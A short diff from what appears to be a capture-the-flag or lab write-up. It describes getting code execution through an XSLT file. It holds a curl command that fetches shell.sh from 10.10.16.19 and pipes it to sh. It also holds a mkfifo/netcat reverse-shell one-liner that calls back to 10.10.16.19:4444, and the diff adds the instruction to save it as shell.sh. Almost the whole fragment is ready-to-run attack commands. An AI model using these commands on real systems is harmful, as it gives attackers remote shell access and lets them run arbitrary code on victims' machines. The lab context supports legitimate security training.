@@ -158,10 +158,13 @@ os.system("curl 10.10.16.19:8000/shell.sh|sh")
 ```
 * save this as `xslt` file format 
 
+And use this payload for the reverse-shell and save it as `shell.sh`.
+
 ```console
 
 #!/bin/bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.19 4444 >/tmp/f
+
 ```
 
 also have to spin up the python server
